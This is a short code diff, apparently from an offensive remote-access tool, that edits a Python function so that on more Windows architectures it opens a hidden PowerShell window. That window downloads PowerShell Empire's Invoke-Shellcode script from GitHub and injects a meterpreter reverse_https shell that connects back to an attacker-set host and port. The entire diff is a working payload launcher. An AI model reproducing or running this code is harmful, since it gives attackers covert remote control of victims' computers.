@@ -32,7 +32,7 @@ def fire():
         # Check if no-ip is online or not
         get_noip_ip_address()
 
-    if platform.machine().endswith('32'):
+    if platform.machine().endswith('32') or platform.machine().endswith('86'):
         try:
             subprocess.Popen("powershell -noprofile -windowstyle hidden iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;" % (LHOST,LPORT), shell=True)
         except WindowsError:
